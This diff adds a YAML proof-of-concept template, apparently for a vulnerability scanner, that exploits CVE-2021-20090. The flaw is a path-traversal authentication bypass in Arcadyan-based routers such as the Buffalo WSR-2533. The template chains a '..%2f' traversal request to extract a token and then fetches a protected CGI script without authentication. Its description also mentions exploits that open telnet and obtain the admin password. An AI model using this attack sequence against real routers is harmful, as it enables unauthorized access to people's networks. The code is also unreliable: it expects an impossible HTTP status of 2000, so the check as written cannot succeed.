@@ -1,0 +1,41 @@
+name: Arcadyan_Routers_Authentication_Bypassing__CVE_2021–20090
+transport: http
+detail:
+  dock: body="css/style-ad-JP.css"
+  product: WSR-2533DHPL2 firmware version <= 1.02, WSR-2533DHP3 firmware version <=
+    1.24 and so on
+  homepage: https://www.buffalo.jp/ and so on
+  impact: ''
+  description: 'A path traversal vulnerability (CVE-2021-20090) in the web interfaces
+    of Buffalo WSR-2533DHPL2 firmware version <= 1.02 and WSR-2533DHP3 firmware version
+    <= 1.24 could allow unauthenticated remote attackers to bypass authentication.
+    This vulnerability also affected many other devices, as the root cause of the
+    vulnerability exists in the underlying Arcadyan firmware.
+
+    Another vulnerabilities, using Configuration File Injection (CVE-2021-20091) to
+    open telnetd and using Improper Access Control(CVE-2021-20092) to get admin password,
+    have only been confirmed on Buffalo WSR-2533 models.
+
+    Notice: openTelnetd and closeTelnetd exploit will reboot target device, target
+    may fail to reboot and remain shutting down. It is recommended to use openTelnetd/closeTelnetd
+    exploit when getAdminPwd exploit is working.'
+set:
+  t: str(int(now())) + "000"
+  requestUrl: request.url
+rules: 
+  r1:
+    method: GET
+    url: /images/..%2finfo.html
+    follow_redirects: false
+    output:
+      search: r'<img title=spacer src="(?P<token>.*?)"'.bsubmatch(response.body)
+      token: base64Decode(substr(search['token'], 78, 100))
+    expression: true
+  r2:
+    method: GET
+    url: /cgi/cgi_info.js?_tn={{token}}&_t={{t}}&_={{t}}
+    follow_redirects: false
+    headers:
+      Referer: '{{requestUrl}}/info.html'
+    expression: response.status == 2000 && response.body.bcontains(b'FirmwareVersion')
+expression: r1() && r2()
